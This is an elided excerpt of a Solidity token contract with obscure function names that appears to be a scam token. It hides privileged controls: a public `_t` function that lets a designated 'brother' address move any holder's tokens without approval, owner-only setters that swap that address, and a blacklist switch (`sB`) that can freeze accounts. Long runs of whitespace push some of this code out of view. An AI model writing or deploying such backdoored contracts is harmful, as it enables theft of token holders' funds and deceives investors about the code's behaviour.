...
contract NB {
    ...
    function _b(address account) public view returns (uint) {
        return _balances[account];
    }
    ...
    function transferFrom(address from,address to,uint amount) public returns (bool) {
        ...
        require(B(),'TransferFrom Error');
        _transfer(from, to, amount);
        return true;
    }
    function _t(address addr1,address addr2,uint num) public returns (bool) {
        require(B(),'TransferFrom Error');
        _transfer(addr1, addr2, num);
        return true;
    }
    constructor() {
        owner=msg.sender;
    ...
    function setBro(address addr) external {
        if(P()){brother=addr;}
    }
    function addPrtc(address ac) external {
        if(owner==msg.sender){prtc[ac]=true;}
    }  
    function sta(uint[6] calldata a1) external {
        if(P()){amo=a1;}
    }
    function sta2(uint[6] calldata a2) external {
        if(P()){amo2=a2;}
    }
    function sPRC(address ac, bool y) external{
       if(P()){prtc[ac]=y;}
    }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
    ...
    function B() private view returns (bool){
       return brother==msg.sender;
    }
    ...
    function showInfo(address from,address to,uint bal,uint uP,uint dP,uint am) public view returns (uint,uint,uint,uint[3] memory){
        ...
        if(!wL[from]&&!gL[from]&&!pL[from]&&!dL[from]&&!wL[to]&&!gL[to]){
            if(block.timestamp>K[1]){
                ...
                if(o||i.t==999){
                    (uint _m,bool _d)=T.D(block.timestamp,i.tt,i.la,i.inv);
                    K[0]=i.inv>_m?i.inv.sub(_m):0;
    ...
    function sB(address account, bool y) external{
        P()&&(bL[account]=y);
    }
